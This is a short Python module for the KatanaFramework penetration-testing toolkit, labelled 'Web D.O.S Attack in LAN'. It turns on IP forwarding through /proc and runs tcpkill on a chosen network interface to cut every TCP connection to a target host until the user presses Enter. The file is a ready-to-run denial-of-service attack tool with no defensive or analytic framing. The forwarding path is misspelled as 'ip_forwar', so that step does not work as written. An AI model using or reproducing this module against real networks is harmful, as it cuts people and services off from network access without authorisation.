# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
import commands
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Web D.O.S Attack in LAN."
	init.CodeName           ="net/web.dos"
	init.DateCreation       ="31/07/2016"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'target'   :["www.test.com"    ,True ,'DNS Target']
	}

	init.aux = "\n Devices Founds: """+str(NET.GetInterfacesOnSystem())+"\n"
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	if NET.AmIConectedToANetwork() and NET.CheckIfExistInterface(init.var['interface']):
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forwar")
		printk.inf("Starting WEB D.O.S Attack in LAN")
		SYSTEM.Subprocess("tcpkill -i "+init.var['interface']+" -9 host "+init.var['target'])
		raw_input(printk.pkey("if you want to stop WEB D.O.S Attack (PRESS [ENTER])"))
		SYSTEM.KillProcess("tcpkill")
		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forwar")

# END CODE MODULE ############################################################################################